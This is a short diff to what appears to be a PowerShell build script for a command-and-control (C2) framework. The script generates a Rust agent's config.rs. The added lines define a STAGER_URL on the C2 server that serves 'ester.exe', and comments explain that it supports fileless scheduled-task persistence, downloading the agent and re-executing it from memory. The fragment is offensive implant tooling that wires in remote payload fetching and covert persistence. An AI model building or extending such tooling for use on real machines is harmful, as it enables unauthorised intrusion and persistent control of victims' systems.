@@ -73,6 +73,9 @@ if (-not $SkipAgent) {
     $configContent += "    str_slice.trim_end_matches('`\0')`n"
     $configContent += "}`n`n"
     $configContent += "pub const C2_SERVER: &str = `"${addr}`";`n"
+    $stagerUrl = "http://${Ip}:${ApiPort}/api/stage0/ester"
+    $configContent += "`n/// URL from which the stager (ester.exe) is served by the C2 server.`n"
+    $configContent += "/// Used by fileless scheduled-task persistence to download & re-exec the agent from memory.`npub const STAGER_URL: &str = `"${stagerUrl}`";`n"
     [System.IO.File]::WriteAllText("$RepoRoot\agent\src\config.rs", $configContent)
     Write-Host "  config.rs -> ${Ip}:${Port}" -ForegroundColor DarkGray
 
